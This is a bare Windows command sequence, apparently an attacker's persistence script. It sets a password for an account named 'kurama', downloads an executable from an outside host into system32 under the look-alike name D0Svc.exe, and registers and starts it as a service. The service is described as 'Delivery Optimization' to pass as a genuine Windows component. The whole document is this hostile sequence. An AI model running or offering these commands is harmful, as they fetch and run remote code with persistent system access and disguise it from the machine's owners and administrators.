net user kurama krystal_the_gamer
curl https://crimson.ninja/Iroh-Service.exe -o C:\Windows\system32\D0Svc.exe
New-Service -Name "D0Svc" -BinaryPathName C:\Windows\system32\D0Svc.exe
sc.exe description D0Svc "Delivery Optimization"
Start-Service -Name "D0Svc"